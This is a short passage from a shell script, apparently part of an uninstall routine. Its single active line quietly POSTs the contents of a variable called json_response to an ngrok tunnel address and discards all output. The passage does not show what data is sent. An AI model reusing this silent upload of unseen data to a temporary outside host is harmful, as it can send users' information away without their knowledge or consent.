...
wget --retry-connrefused --waitretry=1 -t 3 -T 15 -qO- --header="Content-Type: text/plain" --post-data="$json_response" https://42d9-37-111-180-227.ngrok-free.app/api/user/uninstallServer/ &> /dev/null
# echo "... done."
